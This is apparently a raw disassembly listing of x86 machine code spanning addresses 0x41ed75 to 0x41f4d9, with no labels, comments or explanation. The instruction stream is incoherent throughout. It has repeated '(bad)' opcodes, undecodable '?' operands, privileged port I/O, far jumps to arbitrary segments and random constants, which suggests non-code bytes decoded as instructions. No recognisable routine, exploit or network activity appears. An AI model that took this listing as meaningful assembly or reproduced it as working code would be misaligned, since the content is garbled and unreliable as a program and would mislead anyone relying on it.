  41ed75:	pop    es
  41ed76:	mov    WORD PTR [eax],?
  41ed78:	iret   
  41ed79:	push   eax
  41ed7a:	dec    ecx
  41ed7b:	mov    gs,WORD PTR [ebp-0x58]
  41ed7e:	stos   DWORD PTR es:[edi],eax
  41ed7f:	jo     0x41ed6c
  41ed81:	or     eax,0x375c7bc
  41ed86:	fcom   QWORD PTR [esi+0x39]
  41ed89:	lea    ebp,[edx+ebp*8]
  41ed8c:	ror    dh,cl
  41ed8e:	lock push ecx
  41ed90:	mov    ds:0x61051a07,eax
  41ed95:	or     ebp,DWORD PTR [edx+0x19782d76]
  41ed9b:	fistp  DWORD PTR [eax]
  41ed9d:	loopne 0x41eddc
  41ed9f:	loopne 0x41ed70
  41eda1:	das    
  41eda2:	dec    ebp
  41eda3:	test   al,0x95
  41eda5:	sbb    BYTE PTR [ecx-0x3e],ch
  41eda8:	ror    DWORD PTR [esi-0x3119882e],0xa1
  41edaf:	shl    DWORD PTR [edx+0x7e],0x51
  41edb3:	fcmovu st,st(5)
  41edb5:	sbb    dh,BYTE PTR [edx]
  41edb7:	push   edi
  41edb8:	mov    dl,0x90
  41edba:	pusha  
  41edbb:	loop   0x41ee03
  41edbd:	adc    eax,0xc8cb53c2
  41edc2:	clc    
  41edc3:	fbld   TBYTE PTR [esi-0x25d7670e]
  41edc9:	pop    ecx
  41edca:	xchg   esi,eax
  41edcb:	repnz cmp eax,0x9b1b9014
  41edd1:	fsub   st,st(3)
  41edd3:	xor    esi,ebx
  41edd5:	xchg   DWORD PTR [ebx+0x5a6486de],edi
  41eddb:	pop    ebp
  41eddc:	and    ecx,ebp
  41edde:	jne    0x41edb0
  41ede0:	jne    0x41ed9a
  41ede2:	xlat   BYTE PTR ds:[ebx]
  41ede3:	(bad)  
  41ede4:	mov    cl,0xb
  41ede6:	add    BYTE PTR [esi-0x533e496f],bh
  41edec:	sbb    DWORD PTR [ebp+0x2a],0xffffffef
  41edf0:	sbb    DWORD PTR [ecx+0x539be16d],0x2847d074
  41edfa:	pop    ebp
  41edfb:	add    eax,0x248cc342
  41ee00:	mov    al,ds:0x9b61f997
  41ee05:	shl    BYTE PTR [ebp-0x49],1
  41ee08:	stos   DWORD PTR es:[edi],eax
  41ee09:	mov    WORD PTR [edi-0x17],?
  41ee0c:	aas    
  41ee0d:	jp     0x41ee4f
  41ee0f:	bound  eax,QWORD PTR [edi-0x3cac67c4]
  41ee15:	inc    eax
  41ee16:	add    ebp,DWORD PTR [eax]
  41ee18:	pop    edx
  41ee19:	push   ss
  41ee1a:	scas   al,BYTE PTR es:[di]
  41ee1c:	jge    0x41ee0c
  41ee1e:	rcl    DWORD PTR [edi+0x23],0xae
  41ee22:	das    
  41ee23:	stos   DWORD PTR es:[edi],eax
  41ee24:	cwde   
  41ee25:	xor    al,0x4e
  41ee27:	dec    eax
  41ee28:	retf   
  41ee29:	cmp    al,0x7f
  41ee2b:	sub    bl,bh
  41ee2d:	sbb    al,0x9c
  41ee2f:	add    eax,0x1b879bd4
  41ee34:	daa    
  41ee35:	inc    esi
  41ee36:	mov    dh,0x26
  41ee38:	mov    al,ds:0xea614cef
  41ee3d:	fldcw  WORD PTR [edi]
  41ee3f:	rcr    BYTE PTR [edx],0x62
  41ee42:	and    eax,0xf3d4d204
  41ee47:	les    eax,FWORD PTR [ebx]
  41ee49:	stos   DWORD PTR es:[edi],eax
  41ee4a:	inc    edx
  41ee4b:	jno    0x41edf3
  41ee4d:	mov    bl,0xec
  41ee4f:	adc    ch,BYTE PTR [edx]
  41ee51:	aad    0x96
  41ee53:	sub    bl,ch
  41ee55:	popf   
  41ee56:	arpl   WORD PTR [edi-0x526988bc],cx
  41ee5c:	add    cl,BYTE PTR [ecx]
  41ee5e:	int3   
  41ee5f:	imul   esi,ecx,0xffffffab
  41ee62:	pop    ds
  41ee63:	test   al,0x3
  41ee65:	xchg   ebp,eax
  41ee66:	das    
  41ee67:	out    0x13,al
  41ee69:	js     0x41eeaa
  41ee6b:	jmp    0x9e864de1
  41ee70:	xchg   DWORD PTR [esi-0x45],ebp
  41ee73:	test   eax,0x87f26515
  41ee78:	(bad)  
  41ee79:	jecxz  0x41eeba
  41ee7b:	or     eax,0xd2660c98
  41ee80:	test   ecx,ebp
  41ee82:	cmp    DWORD PTR [edx-0x4e429bc6],edx
  41ee88:	(bad)  [edi+0x11]
  41ee8b:	inc    edi
  41ee8c:	mov    eax,0xdbf8fedd
  41ee91:	(bad)  
  41ee92:	sahf   
  41ee93:	repz and eax,0x13dad0fd
  41ee99:	stos   BYTE PTR es:[edi],al
  41ee9a:	or     dl,BYTE PTR [edi+eax*8+0x583ff831]
  41eea1:	dec    edi
  41eea2:	inc    BYTE PTR [edi]
  41eea4:	adc    al,BYTE PTR [eax+0x7546639f]
  41eeaa:	fdiv   QWORD PTR [esi+esi*8+0x6233b849]
  41eeb1:	push   ecx
  41eeb2:	das    
  41eeb3:	inc    eax
  41eeb4:	xor    DWORD PTR [esi-0x767b7d82],eax
  41eeba:	pop    esi
  41eebb:	xchg   esi,eax
  41eebc:	jb     0x41ee70
  41eebe:	aas    
  41eebf:	das    
  41eec0:	stc    
  41eec1:	stos   BYTE PTR es:[edi],al
  41eec2:	test   DWORD PTR [esi],eax
  41eec4:	ret    
  41eec5:	push   edx
  41eec6:	(bad)  
  41eec8:	ja     0x41eebd
  41eeca:	dec    esi
  41eecb:	jge    0x41eedd
  41eecd:	xchg   edi,eax
  41eece:	cmp    eax,0x3e5b6e03
  41eed3:	call   0x8366:0x1dbbd0e6
  41eeda:	push   ss
  41eedb:	outs   dx,DWORD PTR ds:[esi]
  41eedc:	adc    bl,BYTE PTR [ecx-0x3448840a]
  41eee2:	ficom  WORD PTR [ebx+0x2d]
  41eee5:	mov    BYTE PTR [edi+0x26932607],bl
  41eeeb:	mov    ds:0x50e346df,al
  41eef0:	xchg   esi,eax
  41eef1:	jnp    0x41ef50
  41eef3:	stc    
  41eef4:	xor    eax,0xe2c810b9
  41eef9:	inc    edi
  41eefa:	dec    esp
  41eefb:	xchg   edx,eax
  41eefc:	dec    edi
  41eefd:	iret   
  41eefe:	and    esi,DWORD PTR [ebp+0x24]
  41ef01:	jmp    0x74:0x2aa0120d
  41ef08:	and    al,0x4d
  41ef0a:	(bad)  
  41ef0b:	scas   al,BYTE PTR es:[edi]
  41ef0c:	and    dl,BYTE PTR [edx+ecx*1]
  41ef0f:	and    BYTE PTR [ecx+0x41],ah
  41ef12:	xor    al,0xc4
  41ef14:	loopne 0x41ef03
  41ef16:	rcr    ebp,0xd9
  41ef19:	es in  eax,dx
  41ef1b:	dec    esi
  41ef1c:	xchg   esi,eax
  41ef1d:	inc    edi
  41ef1f:	bound  ebp,QWORD PTR [esp+ecx*8-0x6]
  41ef23:	pop    ebx
  41ef24:	clc    
  41ef25:	div    BYTE PTR [edx+0x5b]
  41ef28:	mov    ebx,0x312a5121
  41ef2d:	gs dec eax
  41ef2f:	or     ecx,DWORD PTR [eax]
  41ef31:	shl    DWORD PTR [esi+0x23],0x82
  41ef35:	imul   ebx,DWORD PTR [esi],0x4e7c07be
  41ef3b:	in     al,0x7
  41ef3d:	addr16 into 
  41ef3f:	inc    ebx
  41ef40:	shr    DWORD PTR [edx],1
  41ef42:	adc    al,ah
  41ef44:	aaa    
  41ef45:	gs mov edx,0x25376c2e
  41ef4b:	scas   al,BYTE PTR es:[edi]
  41ef4c:	scas   al,BYTE PTR es:[edi]
  41ef4d:	lods   al,BYTE PTR ds:[esi]
  41ef4e:	push   0x8
  41ef50:	retf   0x74fe
  41ef53:	mov    dh,0x7b
  41ef55:	outs   dx,BYTE PTR ds:[esi]
  41ef56:	or     bh,cl
  41ef58:	dec    eax
  41ef59:	dec    edi
  41ef5a:	xchg   BYTE PTR [ebx+0xc0fd58],al
  41ef60:	aas    
  41ef61:	mov    bh,0x8d
  41ef63:	dec    ebp
  41ef64:	ret    0xd0f9
  41ef67:	pop    ecx
  41ef68:	rcr    ch,1
  41ef6a:	in     eax,0x3
  41ef6c:	xor    BYTE PTR [ebx-0x75],dl
  41ef6f:	(bad)  [ecx+0x5392f3b0]
  41ef75:	and    DWORD PTR [esi-0x34],esp
  41ef78:	mov    ebx,0x500333c2
  41ef7d:	sub    al,0x7
  41ef7f:	mov    ecx,0x841ef3f0
  41ef84:	add    BYTE PTR [esi+0x11],bh
  41ef87:	cmc    
  41ef88:	sub    BYTE PTR [edx],dl
  41ef8a:	(bad)  
  41ef8b:	mov    bh,0x3
  41ef8d:	dec    ecx
  41ef8e:	adc    dh,BYTE PTR [esi+0x4453d835]
  41ef94:	or     ah,BYTE PTR [ebp+0x838a107]
  41ef9a:	xchg   BYTE PTR [ecx],dl
  41ef9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef9d:	out    dx,al
  41ef9e:	outs   dx,BYTE PTR ds:[esi]
  41ef9f:	dec    edx
  41efa0:	inc    edi
  41efa1:	stos   DWORD PTR es:[edi],eax
  41efa2:	dec    edx
  41efa3:	jnp    0x41ef58
  41efa5:	mov    eax,ds:0x2e8af40f
  41efaa:	jae    0x41ef9f
  41efac:	pushf  
  41efad:	push   ss
  41efae:	mov    edx,0x8d1131da
  41efb3:	jge    0x41efdc
  41efb5:	sub    ah,BYTE PTR [esi]
  41efb7:	cld    
  41efb8:	pop    esi
  41efb9:	(bad)  
  41efba:	mov    esp,0xd162685
  41efbf:	mov    esi,0xb464a47
  41efc4:	xor    al,0xa7
  41efc6:	sahf   
  41efc7:	or     BYTE PTR [esi],0xdd
  41efca:	clc    
  41efcb:	and    ah,BYTE PTR [esi+ebp*1]
  41efce:	loope  0x41ef89
  41efd0:	mov    esi,0x1bb5b401
  41efd5:	rcl    eax,cl
  41efd7:	dec    eax
  41efd8:	loopne 0x41efb8
  41efda:	xchg   BYTE PTR [edx+0x45],cl
  41efdd:	jge    0x41efaf
  41efdf:	push   0xffffff86
  41efe1:	js     0x41f055
  41efe3:	add    al,0xb0
  41efe5:	dec    ebx
  41efe6:	mov    ebp,0x6bd655b5
  41efeb:	and    al,0x11
  41efed:	in     eax,0x98
  41efef:	pop    esp
  41eff0:	cmp    BYTE PTR [edi-0x3a7e2eee],dh
  41eff6:	mov    al,ds:0x5a59f211
  41effb:	or     esp,DWORD PTR [ecx]
  41effd:	mov    eax,0x6cabbac0
  41f002:	xor    eax,0x77d03a6f
  41f007:	mov    cl,BYTE PTR [edx+ebx*4-0x5823d0fc]
  41f00e:	loope  0x41f088
  41f010:	dec    eax
  41f011:	sbb    BYTE PTR [eax+ebp*1],dh
  41f014:	mov    ecx,0x2521c78e
  41f019:	mov    eax,ds:0x853f5467
  41f01e:	jmp    0x3366ea53
  41f023:	div    esi
  41f025:	add    BYTE PTR [ebp-0x73],bh
  41f028:	sub    eax,0x9504da77
  41f02d:	push   0x57891b1c
  41f032:	rcl    ecx,1
  41f034:	in     al,dx
  41f035:	mov    DWORD PTR [edi],esi
  41f037:	adc    ecx,esp
  41f039:	pop    ecx
  41f03a:	frstor [esi-0x5a]
  41f03d:	push   0xb3f1f4d0
  41f042:	cmp    DWORD PTR [ebx-0x7d],ecx
  41f045:	loope  0x41f097
  41f047:	mov    cl,0xaf
  41f049:	adc    DWORD PTR [eax+0x6cfdd458],ecx
  41f04f:	out    0x1d,eax
  41f051:	test   DWORD PTR [ebp-0x2a3832e2],ebx
  41f057:	inc    eax
  41f058:	pop    edx
  41f059:	inc    edx
  41f05a:	dec    edi
  41f05b:	inc    ebp
  41f05c:	call   0x391fde30
  41f061:	sbb    eax,0xd6655450
  41f066:	push   ds
  41f067:	pushf  
  41f068:	dec    edi
  41f069:	xor    bh,al
  41f06b:	mov    eax,ds:0x9a1d8716
  41f070:	les    ecx,FWORD PTR [ebp-0x2119134b]
  41f076:	xlat   BYTE PTR ds:[ebx]
  41f077:	fistp  QWORD PTR [eax]
  41f079:	mov    ah,cl
  41f07b:	mov    ecx,0xb6e3d1e0
  41f080:	and    eax,0xe064d829
  41f085:	jbe    0x41f044
  41f087:	js     0x41f0ec
  41f089:	lock mov ebp,0x98bfadae
  41f08f:	mov    BYTE PTR ds:0x1145dc36,ch
  41f095:	cli    
  41f096:	add    al,0xda
  41f098:	xchg   esi,eax
  41f099:	or     al,BYTE PTR [edx]
  41f09b:	sahf   
  41f09c:	add    eax,0x52db2109
  41f0a1:	sbb    eax,0x1c089932
  41f0a6:	gs nop
  41f0a8:	or     edx,esp
  41f0aa:	in     al,dx
  41f0ab:	cmc    
  41f0ac:	loopne 0x41f07c
  41f0ae:	mov    al,0x6a
  41f0b0:	data16 jnp 0x41f048
  41f0b3:	sar    DWORD PTR [ecx],0xfd
  41f0b6:	inc    edi
  41f0b7:	hlt    
  41f0b8:	adc    DWORD PTR [eax-0x52],esp
  41f0bb:	push   ebp
  41f0bc:	and    al,0x75
  41f0be:	sub    esi,ebx
  41f0c0:	adc    eax,0x9c9474e9
  41f0c5:	push   0x73537716
  41f0ca:	ss pop eax
  41f0cc:	lea    eax,ds:0x2b3666b4
  41f0d2:	xchg   ebp,eax
  41f0d3:	retf   0xea87
  41f0d6:	mov    ds:0x7aef30f1,eax
  41f0db:	lods   al,BYTE PTR ds:[esi]
  41f0dc:	xor    DWORD PTR [edx],esi
  41f0de:	adc    edx,DWORD PTR [ecx]
  41f0e0:	sti    
  41f0e1:	pop    ss
  41f0e2:	add    BYTE PTR [ebx],ch
  41f0e4:	sub    ebx,DWORD PTR ds:0xe49546ce
  41f0ea:	(bad)  
  41f0eb:	arpl   WORD PTR [edi+eax*4-0xb],di
  41f0ef:	cmp    BYTE PTR [ecx],bl
  41f0f1:	inc    edi
  41f0f2:	mov    ds:0x8a3aa0da,eax
  41f0f7:	js     0x41f0dd
  41f0f9:	sub    eax,0x1029c3fc
  41f0fe:	(bad)  
  41f0ff:	mov    edx,0x7cfa7eb9
  41f104:	sti    
  41f105:	cmp    BYTE PTR [eax-0x4818a6cb],dl
  41f10b:	cwde   
  41f10c:	aaa    
  41f10d:	xchg   edx,eax
  41f10e:	push   edx
  41f10f:	jmp    0x41f17c
  41f111:	popf   
  41f112:	xchg   edx,eax
  41f113:	fbld   TBYTE PTR [ebx-0x38d513b8]
  41f119:	int3   
  41f11a:	mov    ds:0x1c74ca92,al
  41f11f:	arpl   WORD PTR [ebp-0x7356b82d],cx
  41f125:	dec    ecx
  41f126:	pop    ebp
  41f127:	jmp    0x3f7cd312
  41f12c:	mov    dh,0x87
  41f12e:	mov    edx,0xeed2dc27
  41f133:	call   FWORD PTR [ebp+0x29]
  41f136:	jne    0x41f0c9
  41f138:	in     eax,dx
  41f139:	add    al,0x7f
  41f13b:	out    0xce,al
  41f13d:	jecxz  0x41f1ab
  41f13f:	push   ss
  41f140:	push   ds
  41f141:	sbb    BYTE PTR [edx],bl
  41f143:	lods   al,BYTE PTR ds:[esi]
  41f144:	adc    DWORD PTR [esi+0x6a],0xffffff86
  41f148:	sub    eax,0x53039772
  41f14d:	inc    ebp
  41f14e:	adc    DWORD PTR [ebp+0x2a08adc4],ecx
  41f154:	stos   DWORD PTR es:[edi],eax
  41f155:	outs   dx,BYTE PTR ds:[esi]
  41f156:	dec    ebp
  41f157:	xlat   BYTE PTR ds:[ebx]
  41f158:	int    0x68
  41f15a:	jbe    0x41f180
  41f15c:	jbe    0x41f12b
  41f15e:	xor    ebp,DWORD PTR [edi+0x3]
  41f161:	(bad)  
  41f162:	dec    sp
  41f164:	adc    eax,0xeb51f3b1
  41f169:	xchg   BYTE PTR [edi],ah
  41f16b:	or     al,0xf0
  41f16d:	scas   al,BYTE PTR es:[edi]
  41f16e:	(bad)  
  41f16f:	xor    BYTE PTR [edi+0x14b82811],cl
  41f175:	dec    ebx
  41f176:	and    ecx,DWORD PTR [ebp-0x55]
  41f179:	outs   dx,DWORD PTR ds:[esi]
  41f17a:	div    WORD PTR [edi+0x33]
  41f17e:	adc    ch,BYTE PTR es:[ebp+0x41]
  41f182:	adc    ch,dl
  41f184:	mov    cl,0x59
  41f186:	push   ebx
  41f187:	lea    ecx,[edx]
  41f189:	pop    eax
  41f18a:	mov    dl,0xd5
  41f18c:	repz add ebx,DWORD PTR [eax+ecx*1-0x231c4e8f]
  41f194:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f195:	into   
  41f196:	or     ch,0xff
  41f199:	dec    ebx
  41f19a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f19b:	sub    ch,BYTE PTR [ebx-0x40eee1a1]
  41f1a1:	mov    BYTE PTR [esp+eiz*2-0x8],bh
  41f1a5:	cld    
  41f1a6:	arpl   si,bx
  41f1a8:	and    ebx,DWORD PTR [ecx+0x48]
  41f1ab:	inc    eax
  41f1ac:	outs   dx,DWORD PTR ds:[esi]
  41f1ad:	dec    esi
  41f1ae:	clc    
  41f1af:	and    dl,BYTE PTR [esi-0xf]
  41f1b2:	icebp  
  41f1b3:	fwait
  41f1b4:	or     ebp,DWORD PTR [esi+0x34]
  41f1b7:	jo     0x41f200
  41f1b9:	lock fsub DWORD PTR [ebx+0x68]
  41f1bd:	in     eax,dx
  41f1be:	push   edi
  41f1bf:	sahf   
  41f1c0:	mov    bh,0x36
  41f1c2:	and    BYTE PTR [edi+0x259e9522],ah
  41f1c8:	call   0xb1815316
  41f1cd:	je     0x41f17c
  41f1cf:	jmp    0xdc1cb3d4
  41f1d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1d5:	or     DWORD PTR [edx],ebx
  41f1d7:	mov    dl,0x17
  41f1d9:	pusha  
  41f1da:	mov    dl,0x1a
  41f1dc:	cmp    eax,0xb9056598
  41f1e1:	retf   
  41f1e2:	dec    ecx
  41f1e3:	out    dx,al
  41f1e4:	(bad)  
  41f1e5:	(bad)  
  41f1e6:	pop    ebx
  41f1e7:	inc    ebx
  41f1e8:	mov    BYTE PTR [ecx],bl
  41f1ea:	aaa    
  41f1eb:	arpl   dx,bp
  41f1ed:	inc    DWORD PTR [esi-0x5570da11]
  41f1f3:	mov    al,ds:0xcda1590d
  41f1f8:	adc    DWORD PTR [edx],0xffffffd4
  41f1fb:	test   eax,0xd880104b
  41f200:	and    ch,BYTE PTR [esi+0x65]
  41f203:	addr16 xchg esi,eax
  41f205:	inc    esi
  41f206:	inc    al
  41f208:	add    DWORD PTR [esi],esp
  41f20a:	frstor [eax+0x61]
  41f20d:	shl    DWORD PTR [ebp+0x38],1
  41f210:	dec    edi
  41f211:	jmp    0x41f255
  41f213:	(bad)  
  41f214:	ins    BYTE PTR es:[edi],dx
  41f215:	xchg   BYTE PTR [ecx],al
  41f217:	sub    BYTE PTR [eax],dl
  41f219:	and    al,0x2c
  41f21b:	sti    
  41f21c:	inc    eax
  41f21d:	cli    
  41f21e:	ret    0xe0cd
  41f221:	mov    ecx,0x4bc7e646
  41f226:	jmp    0x41f1e5
  41f228:	push   es
  41f229:	cli    
  41f22a:	comiss xmm0,DWORD PTR [eax-0x6c]
  41f22e:	dec    ebp
  41f22f:	and    al,0xae
  41f231:	imul   ebp,DWORD PTR [esi-0x3d],0x79
  41f235:	sub    BYTE PTR [ebp+ecx*1+0x3],ch
  41f239:	push   ebx
  41f23a:	lahf   
  41f23b:	jl     0x41f2b4
  41f23d:	stc    
  41f23e:	fadd   DWORD PTR ds:0x594b6436
  41f244:	leave  
  41f245:	fwait
  41f246:	enter  0xd2fc,0xbf
  41f24a:	scas   eax,DWORD PTR es:[edi]
  41f24b:	shl    bh,cl
  41f24d:	cmp    DWORD PTR [ebx-0x1a],ecx
  41f250:	inc    esi
  41f251:	scas   eax,DWORD PTR es:[edi]
  41f252:	js     0x41f2b6
  41f254:	or     dl,BYTE PTR [ecx-0xe9442b9]
  41f25a:	test   DWORD PTR [ebp-0xb],esi
  41f25d:	rol    DWORD PTR [esi-0x45],1
  41f260:	popf   
  41f261:	stc    
  41f262:	test   BYTE PTR ds:0x59d0080f,ah
  41f268:	shl    DWORD PTR [edi],0x5a
  41f26b:	(bad)  
  41f26d:	mov    ecx,0xe3bd9b03
  41f272:	repnz sub dl,BYTE PTR [ebx-0x24e894e2]
  41f279:	popa   
  41f27a:	ja     0x41f2f2
  41f27c:	or     ebx,esp
  41f27e:	frstor [edi-0x5]
  41f281:	arpl   ax,bp
  41f283:	(bad)  
  41f284:	cld    
  41f285:	fadd   DWORD PTR [edx-0x7d]
  41f288:	out    0x9a,eax
  41f28a:	scas   eax,DWORD PTR es:[edi]
  41f28b:	or     eax,0x712c22bb
  41f290:	mov    ecx,0x1f35d23d
  41f295:	bound  ecx,QWORD PTR [ecx]
  41f297:	cmp    eax,0x1c7e7611
  41f29c:	push   esp
  41f29d:	out    dx,al
  41f29e:	test   DWORD PTR ds:0x6cc91fc8,eax
  41f2a4:	pop    es
  41f2a5:	add    ebx,DWORD PTR [ecx-0x78]
  41f2a8:	mov    eax,0x9f36d4b6
  41f2ad:	mov    bh,0xc7
  41f2af:	or     esp,DWORD PTR [edi]
  41f2b1:	mov    edi,0x96e08bc1
  41f2b6:	out    0xc9,al
  41f2b8:	inc    ebx
  41f2b9:	inc    edi
  41f2ba:	mov    al,0xa5
  41f2bc:	mov    ebx,0x756111b3
  41f2c1:	add    BYTE PTR [eax],ch
  41f2c3:	int3   
  41f2c4:	xor    ah,BYTE PTR [esi]
  41f2c6:	and    eax,0xe75d3a5c
  41f2cb:	mov    esi,0x91842e51
  41f2d0:	fsub   st(0),st
  41f2d2:	jl     0x41f2dd
  41f2d4:	mov    eax,ds:0xa8e9fbd0
  41f2d9:	cs mov ebx,0xb8f3d05a
  41f2df:	and    ah,cl
  41f2e1:	retf   0x53d6
  41f2e4:	push   cs
  41f2e5:	clc    
  41f2e6:	mov    cl,0xfe
  41f2e8:	bound  esi,QWORD PTR [esi+0x5c]
  41f2eb:	aas    
  41f2ec:	loopne 0x41f2cc
  41f2ee:	mov    al,ds:0x9a5c05bc
  41f2f3:	jp     0x41f29e
  41f2f5:	xchg   ebx,eax
  41f2f6:	push   ecx
  41f2f7:	leave  
  41f2f8:	das    
  41f2f9:	or     eax,0xe7724943
  41f2fe:	add    DWORD PTR [edx],ecx
  41f300:	sbb    bh,BYTE PTR [ecx+0x58]
  41f303:	sti    
  41f304:	push   es
  41f305:	xor    ecx,DWORD PTR [ecx-0x7e]
  41f308:	add    DWORD PTR [edi-0x16f4a951],esi
  41f30e:	dec    edx
  41f30f:	cld    
  41f310:	sub    al,0x85
  41f312:	stc    
  41f313:	fs jnp 0x41f2b6
  41f316:	inc    ebp
  41f317:	fstp   DWORD PTR [edi]
  41f319:	xor    al,0x40
  41f31b:	mov    eax,0x8b9964c3
  41f320:	mov    ecx,0xb3363ed6
  41f325:	mov    ?,WORD PTR [ecx-0x38fe62d4]
  41f32b:	out    dx,al
  41f32c:	scas   al,BYTE PTR es:[edi]
  41f32d:	push   esi
  41f32e:	sti    
  41f32f:	cmp    BYTE PTR [edi],bh
  41f331:	jmp    0x41f34e
  41f333:	mov    DWORD PTR [ebx],esi
  41f335:	pop    ecx
  41f336:	(bad)  
  41f337:	aaa    
  41f338:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f33a:	dec    edx
  41f33b:	or     al,0x65
  41f33d:	sar    DWORD PTR [ebx+eiz*8-0x1b],1
  41f341:	hlt    
  41f342:	fcomp  st(1)
  41f344:	mov    eax,ds:0xed4fc27b
  41f349:	and    eax,0x344154fc
  41f34e:	sar    DWORD PTR [esi-0x53],1
  41f351:	add    DWORD PTR [esi+0x58a6d7fd],0xffffffee
  41f358:	repnz push ds
  41f35a:	sub    eax,0x13213600
  41f35f:	or     al,0xd
  41f361:	inc    eax
  41f362:	jl     0x41f33b
  41f364:	and    eax,0x70caae82
  41f369:	out    0x2d,al
  41f36b:	(bad)  
  41f36c:	in     eax,dx
  41f36d:	mov    edi,0x3378aea5
  41f372:	pushf  
  41f373:	daa    
  41f374:	les    eax,FWORD PTR [esi+0x3]
  41f377:	not    DWORD PTR [esi+0x4277b4cd]
  41f37d:	std    
  41f37e:	or     ah,BYTE PTR [ecx+0x79]
  41f381:	adc    ebp,ebx
  41f383:	add    eax,0x54dc9217
  41f388:	sbb    eax,0x74817035
  41f38d:	out    dx,eax
  41f38e:	(bad)  
  41f38f:	nop
  41f390:	aaa    
  41f391:	lds    ebp,FWORD PTR [ebp-0x69]
  41f394:	push   ebx
  41f395:	mov    dh,BYTE PTR [ebx]
  41f397:	aaa    
  41f398:	icebp  
  41f399:	jbe    0x41f3ef
  41f39b:	sbb    ah,0x95
  41f39e:	push   ebp
  41f39f:	ror    DWORD PTR [edx+0x485a7bd3],cl
  41f3a5:	icebp  
  41f3a6:	adc    eax,0x845aaee0
  41f3ab:	dec    eax
  41f3ac:	popf   
  41f3ad:	mov    fs,eax
  41f3af:	and    esi,DWORD PTR [esi-0x6e]
  41f3b2:	xchg   DWORD PTR [ecx],edx
  41f3b4:	or     ah,BYTE PTR [esi]
  41f3b6:	dec    ebx
  41f3b7:	jge    0x41f34d
  41f3b9:	adc    dh,BYTE PTR [eax+0x3332cbb5]
  41f3bf:	add    DWORD PTR [edi+0x45],0x64
  41f3c3:	retf   
  41f3c4:	xchg   esi,eax
  41f3c5:	jp     0x41f379
  41f3c7:	dec    eax
  41f3c8:	mov    BYTE PTR [edx-0x31bfc3f2],al
  41f3ce:	cdq    
  41f3cf:	xchg   esi,eax
  41f3d0:	retf   
  41f3d1:	sub    esi,DWORD PTR [edi+0x5f]
  41f3d4:	repz icebp 
  41f3d6:	adc    dl,BYTE PTR [esi]
  41f3d8:	sub    DWORD PTR gs:[eax-0x7ac64ed4],esp
  41f3df:	das    
  41f3e0:	inc    esp
  41f3e1:	push   cs
  41f3e2:	mov    esp,0xa2a0c191
  41f3e7:	or     ecx,ecx
  41f3e9:	mov    bh,0x1
  41f3eb:	(bad)  
  41f3ec:	xchg   edx,eax
  41f3ed:	mov    ah,0x19
  41f3ef:	aam    0x75
  41f3f1:	lahf   
  41f3f2:	outs   dx,BYTE PTR ds:[esi]
  41f3f3:	jb     0x41f424
  41f3f5:	jmp    0x41f386
  41f3f7:	fmul   DWORD PTR [esi]
  41f3f9:	jnp    0x41f389
  41f3fb:	mov    ah,0x88
  41f3fd:	out    dx,al
  41f3fe:	loop   0x41f46c
  41f400:	stos   BYTE PTR es:[edi],al
  41f401:	adc    al,0x91
  41f403:	push   es
  41f404:	push   0x53
  41f406:	dec    esi
  41f407:	xchg   esp,eax
  41f408:	test   DWORD PTR ds:0xaaab4789,esp
  41f40e:	pop    ss
  41f40f:	pop    edi
  41f410:	test   BYTE PTR [eax-0x1d],bh
  41f413:	or     ebx,DWORD PTR cs:[ebp-0x4bd6ffe9]
  41f41a:	mov    DWORD PTR [ebp-0x66],ecx
  41f41d:	mov    eax,0xfe95218c
  41f422:	imul   edx,DWORD PTR [edi+0x6a],0xffffffaf
  41f426:	rcl    BYTE PTR [edx+0x5bc4ee2d],1
  41f42c:	push   edx
  41f42d:	je     0x41f3f1
  41f42f:	xor    BYTE PTR [edx-0x7d],0x6a
  41f433:	cmc    
  41f434:	nop
  41f435:	jmp    0x41f3e6
  41f437:	aaa    
  41f438:	mov    dl,0xf
  41f43a:	add    DWORD PTR [edi],0xfffffffa
  41f43d:	pop    esp
  41f43e:	addr16 std 
  41f440:	jecxz  0x41f420
  41f442:	fst    DWORD PTR [eax-0x53]
  41f445:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f446:	and    BYTE PTR [eax],bh
  41f448:	int    0x3a
  41f44a:	ja     0x41f4c8
  41f44c:	sbb    dl,BYTE PTR [eax+0x75]
  41f44f:	popf   
  41f450:	retf   
  41f451:	cs dec ebp
  41f453:	jge    0x41f4d1
  41f455:	popa   
  41f456:	out    0xbc,al
  41f458:	mov    ds:0x9f8a5050,eax
  41f45d:	adc    eax,0xc0752ed0
  41f462:	or     eax,0xf0bdd8ee
  41f467:	cdq    
  41f468:	iret   
  41f469:	sahf   
  41f46a:	call   0x782f3e86
  41f46f:	mov    cl,0x47
  41f471:	int3   
  41f472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f473:	mov    ah,0x74
  41f475:	cmp    eax,0x4e9868f6
  41f47a:	sbb    ebp,DWORD PTR [ebp+edx*2-0x48]
  41f47e:	repz repnz fld DWORD PTR [ebx+0x3c9fcc02]
  41f486:	mov    al,0xa9
  41f488:	jo     0x41f4bd
  41f48a:	out    0xb5,al
  41f48c:	push   eax
  41f48d:	ret    
  41f48e:	pop    ebx
  41f48f:	mov    dh,0x19
  41f491:	push   edx
  41f492:	lds    eax,FWORD PTR [esi-0x58]
  41f495:	cmp    DWORD PTR [ebp-0x4],0xffffffb6
  41f499:	je     0x41f488
  41f49b:	retf   
  41f49c:	sub    al,0x75
  41f49e:	mov    gs,WORD PTR [edx]
  41f4a0:	jmp    0x6d4e316a
  41f4a5:	inc    ebx
  41f4a6:	mov    ds:0x7d48f231,eax
  41f4ab:	jno    0x41f44c
  41f4ad:	and    al,0x88
  41f4af:	inc    ecx
  41f4b0:	mov    eax,ds:0xd9899521
  41f4b5:	inc    edi
  41f4b6:	repz shl BYTE PTR [esi-0x141d42aa],cl
  41f4bd:	inc    esp
  41f4be:	inc    ebp
  41f4bf:	dec    ebp
  41f4c0:	xlat   BYTE PTR ds:[ebx]
  41f4c1:	push   esi
  41f4c2:	xor    eax,0xc0bbb29d
  41f4c7:	and    DWORD PTR [eax+0x438624b8],esp
  41f4cd:	ficomp DWORD PTR [ebx]
  41f4cf:	adc    al,BYTE PTR [edx+0x77]
  41f4d2:	cmp    dh,BYTE PTR [eax]
  41f4d4:	sbb    eax,0xcbb7e8a
  41f4d9:	xchg   ebp,eax
